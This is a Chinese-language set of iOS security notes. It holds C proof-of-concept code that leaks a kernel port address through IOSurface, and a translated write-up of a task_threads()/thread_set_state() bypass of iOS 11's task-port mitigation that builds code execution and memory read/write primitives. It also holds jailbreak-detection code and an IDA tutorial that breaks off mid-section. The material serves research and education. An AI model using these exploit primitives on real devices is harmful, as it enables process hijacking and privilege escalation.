    io_connect_t client  = MACH_PORT_NULL;
    uint64_t refs[8] = { 0x4141414141414141, 0x4242424242424242, 0x4343434343434343, 0x4545454545454545, 0x4646464646464646, 0x4747474747474747, 0x4848484848484848, 0x4949494949494949 };

    uint32_t dict[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,
    };

    service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("service: %x", service);
    if(!MACH_PORT_VALID(service)) goto out;

    ret = IOServiceOpen(service, self, IOSURFACE_UC_TYPE, &client);
    LOG("client: %x, %s", client, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(client)) goto out;

    union
    {
        char _padding[IOSURFACE_CREATE_OUTSIZE];
        struct
        {
            mach_vm_address_t addr1;
            mach_vm_address_t addr2;
            mach_vm_address_t addr3;
            uint32_t id;
        } data;
    } surface;
    size_t size = sizeof(surface);
    ret = IOConnectCallStructMethod(client, IOSURFACE_CREATE_SURFACE, dict, sizeof(dict), &surface, &size);
    LOG("newSurface: %x, %s", surface.data.id, mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    uint64_t in[3] = { 0, 0, 0 };
    ret = IOConnectCallAsyncStructMethod(client, IOSURFACE_SET_NOTIFY, port, refs, 8, in, sizeof(in), NULL, NULL);
    LOG("setNotify: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    uint64_t id = surface.data.id;
    ret = IOConnectCallScalarMethod(client, IOSURFACE_INCREMENT_USE_COUNT, &id, 1, NULL, NULL);
    LOG("incrementUseCount: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    ret = IOConnectCallScalarMethod(client, IOSURFACE_DECREMENT_USE_COUNT, &id, 1, NULL, NULL);
    LOG("decrementUseCount: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    msg_t msg = { { 0 } };
    ret = mach_msg(&msg.head, MACH_RCV_MSG, 0, (mach_msg_size_t)sizeof(msg), port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    LOG("mach_msg: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) goto out;

    result = msg.notify.ref[0] & ~3;

out:;
    IOSafeRelease(client);
    IOSafeRelease(service);
    return result;
}

#ifdef POC
int main(void)
{
    kern_return_t ret;
    int retval = -1;
    mach_port_t port = MACH_PORT_NULL;

    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    LOG("port: %x, %s", port, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(port)) goto out;

    kptr_t addr = leak_port_addr(port);
    LOG("port addr: " ADDR, addr);

    retval = 0;

out:;
    SafePortDestroy(port);
    return retval;
}
#endif

```

## 通过task_threads（）绕过iOS平台二进制限制
```
尽管此API在像Mach这样的微内核系统中有许多合法用途，但它也恰恰使开发变得更加容易：一旦获得进程的任务端口，我们便拥有它。这一事实使任务移植成为漏洞利用的有希望的目标，Apple也注意到了这一点。

一个相对较新的例子是Ian Beer的mach_portal，它利用内核错误来建立com.apple.iohideventsystemMach服务与其客户端之间的中间人连接。Mach_portal使用此功能来获取powerd任务端口的副本，该端口是未沙盒化的根进程，已通过Mach消息发送给com.apple.iohideventsystem。一旦mach_portal具有powerd的任务端口，它实际上就具有powerd的特权。在向苹果披露该漏洞利用后的某个时候，未沙盒化的根进程不再通过Mach消息发送其任务端口。

不久之后，伊恩·比尔（Ian Beer）发布了Triple_fetch，这是libxpc中共享内存问题的一种利用。此漏洞在很大程度上依赖于滥用任务端口，以便在其他进程中执行操作。特别是，在获得任务端口of之后coreauthd，trim_fetch可以使用processor_set_tasks()技巧获取系统上任何其他进程的任务端口，这意味着Triple_fetch对用户空间中的每个进程都具有完全的控制权。坦白说，这就是令人震惊的特权：尚不清楚任何进程都应该具有该级别的控制权。

平台二进制缓解
从iOS 11开始，Apple推出了缓解措施，旨在防止漏洞利用中对任务端口的这种小幅滥用。像大多数缓解措施一样，它不应阻止所有任务端口滥用，但应使攻击者的工作更加困难。特别是，它应防止攻击者在仅提供任务端口的进程中执行任意代码。

缓解措施包括一个称为的新函数task_conversion_eval()，当内核使用ipc_port将该task对象 转换为对象时，将调用该函数convert_port_to_task()。这是此函数的代码；caller是要在任务端口上进行操作的任务，并且victim是要在其上进行操作的任务：

kern_return_t
task_conversion_eval(task_t caller, task_t victim)
{
	/*
	 * Tasks are allowed to resolve their own task ports, and the kernel is
	 * allowed to resolve anyone's task port.
	 */
	if (caller == kernel_task) {
		return KERN_SUCCESS;
	}

	if (caller == victim) {
		return KERN_SUCCESS;
	}

	/*
	 * Only the kernel can can resolve the kernel's task port. We've established
	 * by this point that the caller is not kernel_task.
	 */
	if (victim == kernel_task) {
		return KERN_INVALID_SECURITY;
	}

#if CONFIG_EMBEDDED
	/*
	 * On embedded platforms, only a platform binary can resolve the task port
	 * of another platform binary.
	 */
	if ((victim->t_flags & TF_PLATFORM) && !(caller->t_flags & TF_PLATFORM)) {
#if SECURE_KERNEL
		return KERN_INVALID_SECURITY;
#else
		if (cs_relax_platform_task_ports) {
			return KERN_SUCCESS;
		} else {
			return KERN_INVALID_SECURITY;
		}
#endif /* SECURE_KERNEL */
	}
#endif /* CONFIG_EMBEDDED */

	return KERN_SUCCESS;
}
尽管整个功能很有趣（尤其是与保护kernel_task有关），但与我们相关的部分在底部，它说：“在嵌入式平台上，只有平台二进制文件才能解析另一个平台二进制文件的任务端口。” 如果受害者是平台二进制文件，而调用任务不是，则后续检查将拒绝访问。

在实践中这意味着什么？进程基于其代码签名被授予平台二进制状态：尤其是，它必须由Apple 1签名。由于我们编写的任何攻击代码显然都不会被Apple签名，因此我们的攻击过程不是平台二进制文件，因此 task_conversion_eval()将拒绝我们convert_port_to_task()在任务端口上使用平台二进制文件。

具体而言，这意味着我们无法再对Apple签名的进程的任务端口执行某些操作，这阻止了我们使用恶意的任务端口来控制进程并提升特权。mach_vm_*()操作将全部失败，其他API（例如task_set_exception_ports()和）也会失败 thread_create_running()。由于先前的代码注入框架依赖于这些功能，因此所有缓解措施均有效地阻止了它们。

它实际上保护了什么？
我在为iOS 11.2上的系统服务开发漏洞时发现了这种缓解措施。我的漏洞利用有效负载将在特权进程的上下文中运行，然后将受害者的任务端口发回给我，这样我就可以在受害者中执行代码，而不必每次都利用该错误。但是，我注意到类似的操作mach_vm_read()在返回的任务端口上将失败，并且调查使我采取了上述缓解措施。

每当您遇到新的缓解措施时，都值得进行调查。他们为什么要添加此缓解措施？它旨在保护什么？它如何实现这种保护？它实际上保护了什么？这些问题的目的是了解缓解措施的理论和实践，并希望找到两者不一致的领域。

在我们的情况下，首先要了解在哪里task_conversion_eval()调用。

任务端口的面孔很多
让我们构造（反向）调用图，以找到task_conversion_eval()可以达到的所有方式：

task_conversion_eval
├── convert_port_to_locked_task
│   ├── convert_port_to_space               intran ipc_space_t
│   └── convert_port_to_map                 intran vm_map_t
│       └── convert_port_entry_to_map       intran vm_task_entry_t (vm_map_t)
└── convert_port_to_task_with_exec_token
    ├── ipc_kobject_server
    │   └── ...
    └── convert_port_to_task                intran task_t
        ├── task_info_from_user
        └── port_name_to_task
            └── ...
该intran说明指出，由MIG生成的隐式调用现场。当内核收到包含特殊类型的Mach端口的Mach消息时，它将ipc_port使用在定义类型时在MIG中指定的转换函数，将对象自动转换 为相应的内核对象。例如，这是task_tin中 的定义mach_types.defs：

type task_t = mach_port_t
#if	KERNEL_SERVER
		intran: task_t convert_port_to_task(mach_port_t)
		outtran: mach_port_t convert_task_to_port(task_t)
		destructor: task_deallocate(task_t)
#endif	/* KERNEL_SERVER */
		;
此定义告诉内核中自动生成的MIG代码使用来将ipc_port对象转换为 task对象convert_port_to_task()。例如，这是MIG的定义 thread_create_running()：

/*
 *      Create a new thread within the target task, returning
 *      the port representing that new thread.  The new thread 
 *	is not suspended; its initial execution state is given
 *	by flavor and new_state. Returns the port representing 
 *	the new thread.
 */
routine
#ifdef KERNEL_SERVER
thread_create_running_from_user(
#else
thread_create_running(
#endif
                parent_task     : task_t;
                flavor          : thread_state_flavor_t;
                new_state       : thread_state_t;
        out     child_act       : thread_act_t);
当进程thread_create_running()在用户空间中调用以在任务中创建新线程时，用户空间MIG代码将创建一个包含有关操作信息的Mach消息，然后调用mach_msg()Mach陷阱将控制权转移到内核。内核将看到目标端口（parent_task）由内核拥有并处理消息本身，并将消息传递给MIG处理程序。MIG处理例程将解析消息的内容，并使用将内核中的任务端口转换为实际的任务对象convert_port_to_task()。最后，MIG处理程序将调用的内核实现thread_create_running_from_user()来执行实际工作。

因此，任何时候，内核处理涉及马赫消息task_t，ipc_space_t，vm_map_t，或者vm_task_entry_t，内核将使用一个转换函数，最终召唤出 task_conversion_eval()以检查当前进程应被授予访问权限。

在继续进行之前，有必要讨论为什么保护任务端口的缓解措施似乎还涉及其他类型task_t。在用户空间，task_t，ipc_space_t，vm_map_t，和 vm_task_entry_t都是相同typedef“d到mach_port_t（32位整数）。在内核中，task_t是指向a的指针struct task，ipc_space_t是指向a的指针struct ipc_space，并且vm_map_t是指向a的指针struct _vm_map。（vm_task_entry_t实际上在内核中不存在；convert_port_entry_to_map()返回vm_map_t。）但是，这些内核对象没有获得不同的IPC端口类型：它们都由任务端口表示。原因是a task_t可以唯一地转换为a vm_map_t或ipc_space_t，因此在期望其他类型之一的地方使用任务端口是明确的。这种从用户空间的效果是，即使thread_create_running()索赔采取task_t同时 mach_vm_read()要求采取vm_map_t，你传递一个任务端口两者。

回到缓解措施上，task_conversion_eval()在进程希望对这些类型进行操作时调用似乎是一种强大的防御措施。毕竟，每个在任务端口上运行的代码注入库都依赖于至少一个函数，该函数将消息发送至四种受限类型之一。

不过，也有其他类型之外ipc_space_t，vm_map_t和vm_task_entry_t到任务端口可以被转换：如果你在看mach_types.defs和 ipc_tt.c，你会看到一个任务端口也有米格类型定义的转换 task_name_t，task_inspect_t和ipc_space_inspect_t。稍加挖掘就可以发现，它们是功能更强大的兄弟姐妹的受限版本：它们用于例程，这些例程将检查任务而无需以任何方式对其进行修改。您可以从以下示例中看到此示例的区别 task.defs：

/*
 *	Returns the current value of the selected special port
 *	associated with the target task.
 */
routine task_get_special_port(
		task		: task_inspect_t;
		which_port	: int;
	out	special_port	: mach_port_t);

/*
 *	Set one of the special ports associated with the
 *	target task.
 */
routine task_set_special_port(
		task		: task_t;
		which_port	: int;
		special_port	: mach_port_t);
这task_get_special_port()是一个检查例程：它可用于获取任务的特殊端口的副本。另一方面，它task_set_special_port()是一个修改例程：它可用于更改任务的特殊端口的值。这些功能的行为之间的语义区别被编码为将消息发送到的任务端口的类型。由于 task_get_special_port()对进行操作task_inspect_t，因此表明该函数无法修改任务；相反，由于task_set_special_port()对进行操作task_t，因此表明该函数可以修改任务。

因此，我们已经发现了减缓的一个重要的限制：它不限制在拍摄功能使用任务端口task_name_t，task_inspect_t或ipc_space_inspect_t。因此，虽然我们不能调用mach_vm_read()平台二进制文件的任务端口，但可以调用 task_get_special_port()它。

在哪里搜索解决方法
表面上，我们不能使用检查权限来修改任务，但有两个警告。

首先，需要注意的是，内核本身在a task_t和a 之间没有区别task_inspect_t：它们都是typedefs的struct task指针。因此，task_tvs 的语义 task_inspect_t决定了进程应该如何期待内核的行为，而不是内核在现实中的行为。没有什么可以阻止task_get_special_port()修改相应任务的内核实现 。如果我们可以找到具有检查权限的MIG例程，但仍在修改任务，那么我们也许可以绕过缓解措施。

其次，即使task_inspect_t不能将a用来直接修改任务，也不意味着它不能间接用于修改任务。例如，task_get_special_port()它不修改相应的任务，但是确实为我们提供了该任务的特殊端口的副本，该端口在理论上可以用于修改任务（例如，通过将消息发送到任务所使用的端口）。如果我们找到一个拥有检查权限的MIG例程并产生另一个我们可以控制的对象，那么我们也许可以绕过缓解措施。

这让我们如何为旁路搜索到缓解一个不错的主意：看看所有MIG例程手柄一个task_name_t，task_inspect_t或ipc_space_inspect_t看他们中是否修改任务或产生功能修改的任务。

task_threads（）
在此搜索的早期，我遇到了该函数task_threads()：

/*
 *	Returns the set of threads belonging to the target task.
 */
routine task_threads(
		target_task	: task_inspect_t;
	out	act_list	: thread_act_array_t);
该函数获得task_inspect_t权限，并返回任务中线程的线程端口列表。返回的线程实际上是thread_act_t权限，而不是thread_inspect_t权限，这意味着我们可以thread_set_state()在它们上面调用函数。这很关键，因为 thread_set_state()在线程中设置寄存器的值！

这意味着我们完全绕过了平台二进制任务端口缓解措施：调用 task_threads()任务端口以获取线程端口列表，然后调用thread_set_state()返回的线程端口之一直接pc在该线程中设置寄存器。

通过iOS 11上的任务端口执行任意代码
当然，在设置pc寄存器和调用带有任意参数的任意函数之间仍然存在非常实际的差距。为了弥合这一差距，我写了threadexec。本文的其余部分描述了threadexec如何使用任务端口来获取该任务中的任意代码执行。

为简单起见，我将注入过程的上下文称为“本地”，并将注入过程的上下文称为“远程”。

我们的目标是使用远程进程的任务端口来：

在远程进程中使用任意参数调用任意函数并获取返回值；
在远程过程中读写内存；和
在本地和远程任务之间传输Mach端口（发送或接收权限）。
这些功能对于大多数漏洞利用已经足够。

步骤1：线程劫持
我们要做的第一件事是调用task_threads()任务端口以获取远程任务中的线程列表，然后选择其中一个进行劫持。与传统的代码注入框架不同，我们无法创建新的远程线程，因为thread_create_running()它将被新的缓解措施阻止。

劫持现有线程意味着我们将干扰我们要注入的进程的正常功能。但是，该库是专门为在我们不关心破坏受害者功能的漏洞利用中使用而设计的。

拥有远程线程的线程端口后，我们将进行劫持，我们可以调用thread_suspend()来停止线程的运行。

此时，我们对远程线程的唯一有用控制是停止它，启动它，获取其寄存器值并设置其寄存器值。2特别是，我们无法在远程线程中读取或写入内存，这对于我们可能希望使受害者进程执行的更复杂的任务至关重要。因此，我们将必须弄清楚如何通过从此访问中构建某种执行原语来完全控制远程线程的内存。

幸运的是，即使没有读/写原语，arm64体系结构和调用约定也使构建函数调用原语变得容易。标准的调用约定使我们可以将前8个（整数）自变量放入寄存器中。只要我们要调用的函数接受不超过8个参数（这是非常慷慨的要求），我们就不必在调用之前设置堆栈，从而使我们能够在没有内存写功能的情况下通过。同样，返回值是在寄存器中指定的（而不是在x86-64之类的堆栈中），这为我们提供了一种简单的方法来控制执行的函数返回后发生的情况。

话虽如此，即使我们不对其内存进行写操作，我们仍然需要一个有效的堆栈指针作为开始。幸运的是，我们劫持了一个先前初始化并正在运行的线程，因此该sp寄存器已指向有效的堆栈。

因此，我们可以x0通过x7将远程线程中的寄存器设置pc为参数，设置为要执行的函数并启动线程来启动远程函数调用。这将导致远程线程使用提供的参数运行该函数，然后该函数将返回。在这一点上，我们需要检测返回值并确保线程不会崩溃。

有几种方法可以解决此问题。一种方法是在调用函数之前使用thread_set_exception_ports()并将返回地址寄存器设置为lr无效地址，从而为远程线程注册和异常处理程序。这样，在函数运行之后，将生成一个异常，并将一条消息发送到我们的异常端口，这时我们可以检查线程的状态以获取返回值。但是，为简单起见，我复制了Ian Beer的Triple_fetch利用中使用的策略，该策略设置lr为一条指令的地址，该指令将无限循环，然后反复轮询线程的寄存器，直到pc指向该指令为止。

至此，我们有了一个基本的执行原语：我们可以调用最多8个参数的任意函数，并获取返回值。但是，离我们的目标还有很长的路要走。

步骤2：用于通信的马赫端口
下一步是创建Mach端口，我们可以在这些端口上与远程线程进行通信。这些Mach端口稍后将有助于在任务之间转移任意发送和接收权限。

为了建立双向通信，我们将需要创建两个Mach接收权限：一个在本地任务中，一个在远程任务中。然后，我们将需要将每个端口的发送权转移给其他任务。这将为每个任务提供一种发送消息的方式，该消息可以被其他任务接收。

首先让我们着重于设置本地端口，即本地任务持有接收权的端口。通过调用，我们可以像创建其他端口一样创建Mach端口mach_port_allocate()。诀窍是使该端口的发送权进入远程任务。

我们可以使用一个简单的技巧，仅使用基本执行原语将当前任务的发送权限复制到远程任务中，方法是使用以下方法将发送权限存储到远程线程的THREAD_KERNEL_PORT特殊端口中的本地端口 thread_set_special_port()：然后，我们可以进行远程线程调用mach_thread_self()以检索发送权限。

接下来，我们将设置远程端口，这几乎与我们刚刚做的相反。我们可以通过调用使远程线程分配一个Mach端口mach_reply_port()；我们不能使用它， mach_port_allocate()因为后者会在内存中返回分配的端口名，并且我们还没有读取原语。一旦有了端口，就可以通过调用mach_port_insert_right()远程线程来创建发送权限 。然后，我们可以通过调用将端口隐藏在内核中thread_set_special_port()。最后，回到本地任务，我们可以通过调用thread_get_special_port()远程线程来检索端口，从而为我们分配了刚在远程任务中分配的Mach端口的发送权。

至此，我们已经创建了用于双向通信的Mach端口。

步骤3：基本内存读/写
现在，我们将使用execute原语创建基本的内存读取和写入原语。这些基元不会被大量使用（我们将很快升级到功能更强大的基元），但是它们是帮助我们扩展对远程过程的控制的关键步骤。

为了使用我们的execute原语读写存储器，我们将寻找以下函数：

uint64_t read_func(uint64_t *address) {
    return *address;
}
void write_func(uint64_t *address, uint64_t value) {
    *address = value;
}
它们可能对应于以下程序集：

_read_func:
    ldr     x0, [x0]
    ret
_write_func:
    str     x1, [x0]
    ret
快速浏览一些常见的库，发现一些不错的候选库。要读取内存，我们可以使用 property_getName()函数从Objective-C的运行时库：

const char *property_getName(objc_property_t prop)
{
    return prop->name;
}
事实证明，prop是的第一个字段objc_property_t，因此这直接对应于read_func上面的假设。我们只需要执行一个远程函数调用，第一个参数是我们要读取的地址，返回值就是该地址处的数据。

寻找一个预先编写的函数来写入内存要困难一些，但是仍然有很多不错的选择，而不会产生不希望的副作用。在libxpc中，该_xpc_int64_set_value()函数具有以下反汇编：

__xpc_int64_set_value:
    str     x1, [x0, #0x18]
    ret
因此，要在address执行64位写入address，我们可以执行远程调用：

_xpc_int64_set_value(address - 0x18, value)
有了这些原语，我们就可以创建共享内存了。

步骤4：共享内存
我们的下一步是在远程任务和本地任务之间创建共享内存。这将使我们能够更轻松地在进程之间传输数据：有了共享的内存区域，任意内存的读写就如同远程调用一样简单memcpy()。此外，拥有共享的内存区域将使我们能够轻松地建立堆栈，从而可以调用具有8个以上参数的函数。

为了使事情变得简单，我们可以重用libxpc的共享内存功能。Libxpc提供了XPC对象类型，OS_xpc_shmem它允许在XPC上建立共享内存区域。通过反转libxpc，我们确定它OS_xpc_shmem基于马赫内存条目，马赫内存条目是代表虚拟内存区域的马赫端口。而且，由于我们已经展示了如何将Mach端口发送到远程任务，因此我们可以使用它轻松地设置自己的共享内存。

首先，我们需要分配要共享的内存mach_vm_allocate()。我们需要使用mach_vm_allocate()以便可以用来为该区域xpc_shmem_create()创建一个 OS_xpc_shmem对象。xpc_shmem_create()将为我们创建Mach内存条目，并将将Mach发送权存储到该内存条目的不透明 OS_xpc_shmem对象中，偏移量为0x18。

有了内存入口之后，我们将OS_xpc_shmem在远程进程中创建一个表示相同内存区域的对象，从而允许我们调用xpc_shmem_map()以建立共享内存映射。首先，我们执行一个远程调用来malloc()为分配内存， OS_xpc_shmem并使用我们的基本写入原语复制本地OS_xpc_shmem对象的内容 。不幸的是，结果对象不是很正确：其偏移处的Mach内存条目字段0x18包含内存条目的本地任务名称，而不是远程任务的名称。为了解决这个问题，我们将使用thread_set_special_port()技巧将Mach内存条目的发送权限插入远程任务，然后0x18使用远程内存条目的名称覆盖字段。此时，遥控器OS_xpc_shmem对象有效，可以通过远程调用建立内存映射xpc_shmem_remote()。

步骤5：完全控制
有了已知地址的共享内存和任意执行原语，我们就可以完成。分别通过memcpy()对共享区域的调用和对共享区域的调用来实现对任意存储器的读写。具有超过8个参数的函数调用是根据调用约定通过在堆栈上的前8个参数之外布置其他参数来执行的。通过在较早建立的端口上发送Mach消息，可以在任务之间转移任意的Mach端口。我们甚至可以使用文件端口在进程之间传输文件描述符（特别感谢Ian Beer在Triple_fetch中演示了该技术！）
```

## 为什么黑客这么喜欢攻击棋牌游戏呢？
```
1、篡改数据
部分攻击游戏的人群中有部分人是属于游戏玩家，他们想要通过入侵游戏服务器，篡改游戏数据包，使自己的的角色能得到更多的几率赢。

2、盗卖游戏币
这种情况一般出现在较大的棋牌游戏上，黑客通过入侵后台，修改金币数量的形式，像其他牌友出售金币。

3、发泄情绪
在游戏中有些懂技术的玩家因为输钱，内心不愉快觉得是游戏程序的原因，会报复性的攻击游戏。

4、同行竞争
市场上总有一些规律来自于，越暴力的行业，想做的人就会越多。同行之间的恶意竞争，就会接踵而来。在利益的驱使下，想通过网络攻击同行服务器的形式，获得更多的玩家用户的棋牌游戏公司也是存在的。

5、勒索行为
想通过勒索去获利的黑客，通常会找一些比较小的棋牌游戏公司。因为平台小，不成熟的情况下，漏洞也会比较多。
```

# App越狱检测
## 一般App编译生成的函数，都存放于Macho文件的`__TEXT`区  
## 如果是系统的原函数，则位于`__DATA`区
## 如果检测到系统的函数(如open,getenv等)，它的函数地址位于`__TEXT`区，则可断定它被fishhook重绑rebinding
## 用task_info找出进程的信息,得到dyld_all_image_infos，遍历dyld_uuid_info数组来打印信息, 比用_dyld_image_count  _dyld_get_image_name的方法准确
```
#include "uncacheModules.h"
#include "defs.h"
#include <mach/task_info.h>
#include <mach/task.h>
#include <mach-o/dyld_images.h>
#include <stdlib.h>
#include <mach-o/loader.h>
#import <Foundation/Foundation.h>

/*
 可以用MachoView打开一个dylib了解详细
 定位到 dylib , Load Commands下的LC_ID_DYLIB 一节下，找到此动态库的路径全名
 如: /Library/MobileSubstrate/DynamicLibraries/awemeHOOK.dylib
*/
void  print_mach_header_dylib_name(const struct mach_header_64* mheader)
{
    if(mheader->magic == MH_MAGIC_64 && mheader->ncmds > 0)
    {
        void *loadCmd = (void*)(mheader + 1) ;
        struct segment_command_64 *sc = (struct segment_command_64 *)loadCmd;
        
        for ( int index = 0; index < mheader->ncmds; ++index , sc = (struct segment_command_64*)((BYTE*)sc + sc->cmdsize))
        {
            
            if (sc->cmd == LC_ID_DYLIB) {
                
                struct dylib_command *dc = (struct dylib_command *)sc;
                struct dylib dy = dc->dylib;
                char *str = (char*)dc + dy.name.offset;
                

                NSLog(@"%s",str);
                
                //第二种方法
                //也可以用vm_read_overwrite来读取信息
                break;
            }
            
        }
        
    }
}


void getAllUncachedModules()
{
    NSLog(@"--- getAllUncachedModules ---");

    integer_t task_info_out[TASK_DYLD_INFO_COUNT];
    mach_msg_type_number_t task_info_outCnt = TASK_DYLD_INFO_COUNT;
    if( task_info( mach_task_self_ , TASK_DYLD_INFO , task_info_out, &task_info_outCnt) == KERN_SUCCESS )
    {
        struct task_dyld_info dyld_info = *(struct task_dyld_info*)(void*)(task_info_out);
        struct dyld_all_image_infos* infos = (struct dyld_all_image_infos *) dyld_info.all_image_info_addr;
        
        /* only images not in dyld shared cache 相比于infoarray ，这里过滤掉了在dyld_shared_cache里面的那些库 */
        struct dyld_uuid_info* pUuid_info  = (struct dyld_uuid_info*) infos->uuidArray; //v4

        for( int i = 0 ; i < infos->uuidArrayCount; i++, pUuid_info += 1)
        {
            const struct mach_header_64* mheader = (const struct mach_header_64*)pUuid_info->imageLoadAddress;
            if (mheader->filetype == MH_DYLIB) {
                print_mach_header_dylib_name(mheader);
            }
            
        }
    }
    
    
    NSLog(@"--- end ---");
}
```

# IDA反编译
## 虽然还原出来的代码不能直接使用，但是其参考作用不容否认

## 1.生成伪代码：
view-Open subviews-Generate pesudocode (快捷键F5)

## 2.伪代码切换到对应的反汇编代码：
前面说了，IDA生成的伪代码不可全信。当怀疑伪代码的正确性时，需要返回到反汇编代码对比。但是有别于IDA view和Hex view窗口，两者是同步定位的关系，Pseudocode和IDA view窗口之间不存在这样的关系。可以通过Jump-Jump to pseudocode (快捷键)跳回到对应的源码

## 3.修改变量(函数)名：
除非有pdb文件，否则反编译器生成的变量名/函数名简直惨不忍睹，这时候需要修改变量名。在变量上右键-Rename lvar-在Please enter a string对话框中输入变量名 (快捷键N)，修改函数名同理。修改后，伪代码中所有使用该变量的地方都跟着被修正了。

->

(修改函数名/变量名前后)

## 4.修改变量类型：
如下面源码中，main函数中定义了字符串数组，并进行了初始化。

int main(int /*argc*/, char * /*argv*/[])
{
 
	int ret = 0;
	unsigned char result[32] = { 0 };
        ...
}
根据反汇编经验数组的初始化在反汇编代码中会以为数组元素赋值的形式实现。但是反编译器不能区分是普通变量初始化还是数组元素赋值，所以经常出错。下面是反编译器提供的伪代码：
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int j; // [esp+D0h] [ebp-4Ch]
  unsigned int i; // [esp+DCh] [ebp-40h]
  char Buf1; // [esp+E8h] [ebp-34h]
  int v7; // [esp+E9h] [ebp-33h]
  int v8; // [esp+EDh] [ebp-2Fh]
  int v9; // [esp+F1h] [ebp-2Bh]
  int v10; // [esp+F5h] [ebp-27h]
  int v11; // [esp+F9h] [ebp-23h]
  int v12; // [esp+FDh] [ebp-1Fh]
  int v13; // [esp+101h] [ebp-1Bh]
  __int16 v14; // [esp+105h] [ebp-17h]
  char v15; // [esp+107h] [ebp-15h]
  int ret; // [esp+110h] [ebp-Ch]
 
  ret = 0;
  Buf1 = 0;
  v7 = 0;
  v8 = 0;
  v9 = 0;
  v10 = 0;
  v11 = 0;
  v12 = 0;
  v13 = 0;
  v14 = 0;
  v15 = 0;
  ```
这样的伪代码与真实代码相去甚远，因此，需要将字符型变量v15修改成数组。在变量上右键-set lvar type-please enter a string中输入变量的新类型，下面是修正后的代码：
```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned int j; // [esp+D0h] [ebp-4Ch]
  unsigned int i; // [esp+DCh] [ebp-40h]
  char result[32]; // [esp+E8h] [ebp-34h]
  int ret; // [esp+110h] [ebp-Ch]
 
  ret = 0;
  result[0] = 0;
  *(_DWORD *)&result[1] = 0;
  *(_DWORD *)&result[5] = 0;
  *(_DWORD *)&result[9] = 0;
  *(_DWORD *)&result[13] = 0;
  *(_DWORD *)&result[17] = 0;
  *(_DWORD *)&result[21] = 0;
  *(_DWORD *)&result[25] = 0;
  *(_WORD *)&result[29] = 0;
  result[31] = 0;
 ``` 
## 5.转换为指针/结构体指针：
在x86机器上，整形变量和(结构体)指针变量占用的地址空间相同，所以，反编译器经常会混淆两者。如下面源码中，函数原型为:

void md5_final(md5_ctx *ctx, const unsigned char *buf, size_t size, unsigned char *result);
而反编译器生成如此不伦不类的函数原型：
```
void *__cdecl md5_final(int a1, char* a2, size_t a3, char* *a4)
{
  unsigned int v4; // STFC_4
  int v5; // STF0_4
  signed __int64 v6; // rax
  unsigned int v8; // [esp+F0h] [ebp-54h]
  int Dst[14]; // [esp+FCh] [ebp-48h]
  int v10; // [esp+134h] [ebp-10h]
  int v11; // [esp+138h] [ebp-Ch]
  ```
对于基本类型指针，做法同4.修改变量类型，不再赘述；

对于非基本类型指针，为了将int变量修正为结构体指针变量，可以在变量定义处右键-convert to struct*-Select a structure，（如果是自定义的结构体，需要在IDA Structures窗口中创建该结构体，否则该结构体不会出现在"Select a structure"列表中）

最终生成如下伪代码：
```
void *__cdecl md5_final(md5_ctx *a1, char *a2, size_t a3, char *a4)
{
  unsigned int v4; // STFC_4
  int v5; // STF0_4
  __int64 v6; // rax
  unsigned int v8; // [esp+F0h] [ebp-54h]
  int Dst[14]; // [esp+FCh] [ebp-48h]
  int v10; // [esp+134h] [ebp-10h]
  int v11; // [esp+138h] [ebp-Ch]
  ```
如果想撤回修改，将结构体指针变回整形变量，只要在变量上右键-Reset pointer type即可。



## 6.变量映射：
IDA生成的伪代码中变量满天飞，特别是参与大量计算的代码片。很多变量是中间变量，由反编译器生成的，并不存在于真正的源码中。这些中间变量的存在，多少会影响我们分析源码，所以我们要把这些中间变量映射到其他变量上。

如下面的源码：
```
static void md5_final(md5_ctx *ctx, const unsigned char *buf, size_t size, unsigned char *result)
{
    ...
    	uint32_t index = ((uint32_t)ctx->length_ & 63) >> 2;
	uint32_t shift = ((uint32_t)ctx->length_ & 3) * 8;
 
	//添加0x80进去，并且把余下的空间补充0
	message[index] &= ~(0xFFFFFFFF << shift);
	message[index++] ^= 0x80 << shift;
 
	//如果这个block还无法处理，其后面的长度无法容纳长度64bit，那么先处理这个block
	if (index > 14)
	{
		while (index < 16)
		{
			message[index++] = 0;
		}
 
		zen_md5_process_block(ctx->hash_, message);
		index = 0;
	}
      
```
然而，经过IDA的反编译，生成若干中间变量：
```
void *__cdecl md5_final(md5_ctx *a1, char *a2, size_t a3, char *a4)
{
    ...
  v4 = (unsigned __int64)(ctx->length & 0x3F) >> 2;
  v5 = 8 * (ctx->length & 3);
  message[v4] &= ~(-1 << v5);
  message[v4] ^= 128 << v5;
  v8 = v4 + 1; //<----------------v8是中间变量
  if ( v8 > 0xE )
  {
    while ( v8 < 0x10 )
      message[v8++] = 0;
    sub_401540(ctx->hash_, message);
    v8 = 0;
  }
  ```
修正这个差异需要用到变量映射的功能。在变量v8处右键-Map to another variable-Map v8 to...列表框中选择一个要被映射的变量。

## 7.高级技能：
有时，反编译器会过度优化，并完全消除对易失性变量的引用。比如在.rodata节内定义有变量i，由于反编译器觉得没有人会修改变量i，而把部分分支优化没了，如：
```
.text:00401799                 cmp     ds:dword_40E000, 0
.text:004017A0                 jz      short loc_4017E6
```
指令引用了变量dword_40E000，它定义在：
```
.r_only:0040E000 ; Segment type: Pure data
.r_only:0040E000 ; Segment permissions: Read
.r_only:0040E000 _r_only         segment para public 'DATA' use32
.r_only:0040E000                 assume cs:_r_only
.r_only:0040E000                 ;org 40E000h
.r_only:0040E000 dword_40E000    dd 0                    ; DATA XREF: sub_401770+29
反编译器认为上面的汇编代码等效于：
```
if (dword_40E000) {
